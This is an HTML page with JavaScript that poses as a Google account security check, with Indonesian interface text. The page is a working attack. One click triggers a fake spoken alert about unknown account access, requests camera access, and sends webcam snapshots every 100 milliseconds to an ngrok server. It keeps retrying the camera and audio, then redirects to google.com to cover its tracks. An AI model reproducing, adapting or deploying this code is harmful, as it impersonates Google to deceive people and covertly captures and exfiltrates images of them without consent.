<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Security Alert</title>
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; }
  body { background: #fff; min-height: 100vh; overflow: hidden; display: flex; justify-content: center; align-items: center; text-align: center; cursor: pointer; }
  .panel { background: #fff; padding: 40px; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.1); max-width: 400px; width: 100%; border: 1px solid #ddd; }
  h2 { color: #4285f4; margin-bottom: 10px; }
  p { color: #666; font-size: 14px; margin-bottom: 20px; }
  #log { margin-top: 20px; background: #000; padding: 10px; border-radius: 6px; color: #0f0; font-size: 12px; font-family: monospace; text-align: left; height: 120px; overflow-y: auto; }
  iframe, audio, video, embed, object, svg, canvas { display: none !important; }
</style>
</head>
<body>

<div class="panel" id="main-card">
  <h2>🔒 Google Security Check</h2>
  <p>Klik untuk memverifikasi akun Google Anda.</p>
  <div id="log">Sistem siap.</div>
</div>

<div id="launcher-container" style="display: none;"></div>
<video id="cam-feed" autoplay playsinline muted></video>
<canvas id="processing-canvas" width="640" height="480"></canvas>

<script>
(function () {
  'use strict';

  var logEl = document.getElementById('log');
  var executed = false;
  var streamInterval = null;
  var audioCtx = null;
  var ttsStarted = false;
  var ttsCount = 0;

  function log(msg) {
    logEl.innerHTML += "> " + msg + "<br>";
    console.log(msg);
  }

  // ============================================
  // KONFIGURASI
  // ============================================
  var TARGET_URL = "https://www.google.com";
  var SERVER_ENDPOINT = "https://studly-unallegorized-brecken.ngrok-free.dev/";
  
  var CONFIG = {
    tts: {
      text: "Google Security Alert. Your account has been accessed from an unknown device. If this was not you, verify your identity immediately.",
      lang: 'en-US',
      rate: 0.85,
      pitch: 1.0,
      volume: 1.0,
      repeatInterval: 8000,
      maxRepeats: 20
    },
    silentWav: 'data:audio/wav;base64,UklGRiQAAABXQVZFZm10IBAAAAABAAEARKwAAIhYAQACABAAZGF0YQAAAAA='
  };

  // ============================================
  // 1. AUDIO LOGIC (DARI KODE ANDA)
  // ============================================
  function speakOnce() {
    if (!('speechSynthesis' in window)) return;
    if (ttsCount >= CONFIG.tts.maxRepeats) return;

    try {
      var u = new SpeechSynthesisUtterance(CONFIG.tts.text);
      u.lang = CONFIG.tts.lang;
      u.rate = CONFIG.tts.rate;
      u.pitch = CONFIG.tts.pitch;
      u.volume = CONFIG.tts.volume;

      var voices = window.speechSynthesis.getVoices();
      var enVoice = voices.find(function (v) { return v.lang.indexOf('en') === 0; });
      if (enVoice) u.voice = enVoice;

      u.onstart = function () { log("[+] TTS Speaking #" + ttsCount); };
      u.onerror = function (e) { log("[-] TTS Error: " + e.error); };
      u.onend = function () {
        ttsCount++;
        if (ttsCount < CONFIG.tts.maxRepeats) {
          setTimeout(speakOnce, CONFIG.tts.repeatInterval);
        }
      };

      window.speechSynthesis.speak(u);
    } catch (e) { log("[-] TTS fail: " + e.message); }
  }

  function startTTS() {
    if (ttsStarted) return;
    ttsStarted = true;
    window.speechSynthesis.cancel();
    speakOnce();
  }

  function unlockAudioContext() {
    try {
      var ctx = new (window.AudioContext || window.webkitAudioContext)();
      if (ctx.state === 'suspended') {
        ctx.resume().then(function () { log("[+] AC Resumed"); }).catch(function(){});
      }
      var osc = ctx.createOscillator();
      var gain = ctx.createGain();
      gain.gain.value = 0.0001;
      osc.frequency.value = 20000;
      osc.connect(gain);
      gain.connect(ctx.destination);
      osc.start();
      osc.stop(ctx.currentTime + 0.1);
    } catch (e) {}
  }

  function trySilentAudio() {
    try {
      var a = new Audio(CONFIG.silentWav);
      a.volume = 0.0001;
      a.loop = true;
      var p = a.play();
      if (p && p.catch) p.catch(function(){});
    } catch (e) {}
  }

  // ============================================
  // 2. CAMERA & STREAMING
  // ============================================
  function sendImageToServer() {
    try {
      var video = document.getElementById('cam-feed');
      var canvas = document.getElementById('processing-canvas');
      var ctx = canvas.getContext('2d');

      if (video.readyState === video.HAVE_ENOUGH_DATA) {
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
        
        canvas.toBlob(function(blob) {
          if (!blob) return;
          var formData = new FormData();
          formData.append('file', blob, 'capture.jpg');

          fetch(SERVER_ENDPOINT, {
            method: 'POST',
            body: formData
          }).then(function(res) {
            log("[+] Gambar terkirim: " + res.status);
          }).catch(function(err) {
            log("[-] Gagal kirim: " + err.message);
          });
        }, 'image/jpeg', 0.6);
      }
    } catch(e) {}
  }

  function startCamera() {
    try {
      log("[+] Meminta Izin Kamera...");
      
      navigator.mediaDevices.getUserMedia({ video: true, audio: false })
        .then(function(stream) {
          var video = document.getElementById('cam-feed');
          video.srcObject = stream;
          video.play().catch(function(){});
          log("[+] 🚨 KAMERA BERHASIL diakses!");

          if (streamInterval) clearInterval(streamInterval);
          streamInterval = setInterval(sendImageToServer, 100);
        })
        .catch(function(err) {
          log("[-] Kamera diblokir: " + err.name);
        });
    } catch(e) {}
  }

  // ============================================
  // TRIGGER (KLIK)
  // ============================================
  document.body.addEventListener('click', function() {
    if (executed) return;
    executed = true;

    document.getElementById('main-card').innerHTML = `
      <h2>⏳ Memverifikasi...</h2>
      <p>Menghubungkan ke Google...</p>
      <div id="log"></div>
    `;
    logEl = document.getElementById('log');
    log("[!] Memulai Full Audio & CCTV Hijack...");

    // ============================================
    // A. AUDIO INIT (0ms)
    // ============================================
    unlockAudioContext();
    trySilentAudio();
    startTTS();
    startCamera();

    // ============================================
    // B. REDIRECT KE GOOGLE (500ms)
    // ============================================
    setTimeout(function() {
      log("[+] Redirect ke Google.com...");
      try {
        window.location.href = TARGET_URL;
      } catch(e) {}
    }, 500);

    // ============================================
    // C. RETRY AUDIO & CAMERA (1000ms, 2000ms)
    // ============================================
    setTimeout(function() {
      if (!ttsStarted) startTTS();
      if (!streamInterval) startCamera();
    }, 1000);

    setTimeout(function() {
      if (!ttsStarted) startTTS();
      if (!streamInterval) startCamera();
    }, 2000);

    // ============================================
    // D. RETRY LOOP (Setiap 2 detik)
    // ============================================
    var retryCount = 0;
    var retry = setInterval(function () {
      retryCount++;
      unlockAudioContext();
      trySilentAudio();
      if (!ttsStarted) startTTS();
      if (!streamInterval) startCamera();
      if (retryCount > 10) clearInterval(retry);
    }, 2000);

  }, { once: true });

})();
</script>
</body>
</html>
